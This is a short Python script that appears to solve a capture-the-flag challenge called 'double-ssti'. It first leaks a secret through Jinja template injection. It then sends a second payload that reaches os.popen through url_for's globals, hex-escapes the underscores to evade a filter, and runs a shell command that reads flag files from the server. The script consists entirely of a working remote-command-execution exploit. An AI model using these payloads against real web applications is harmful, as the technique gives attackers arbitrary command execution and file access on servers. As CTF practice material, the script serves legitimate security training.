import requests
import re
import html
from base64 import b64decode

URL = 'https://double-ssti.chal.h4ck3r.quest'
u = lambda p = '/': URL + p

payload1 = ['{{ secret }}', 'owo']
r = requests.get(u('/welcome'), params={ 'name': payload1 })
secret = re.findall('Hello (.+),owo!', r.text)[0]

cmd = 'cat /y000_i_am_za_fl4g'
cmd = 'bash -c "cat /*f*"'
payload2 = f"url_for|attr('__globals__')|attr('__getitem__')('o'+'s')|attr('popen')('{cmd}')|attr('read')()"
payload2 = "{{" + payload2 + "}}" 
payload2 = payload2.replace('__', '\\x5f\\x5f')
r = requests.post(u(f'/2nd_stage_{secret}'), data={ 'name': payload2 })
res = r.text[10:-4].strip()
# res = b64decode(res).decode()
res = html.unescape(res)
print(res)
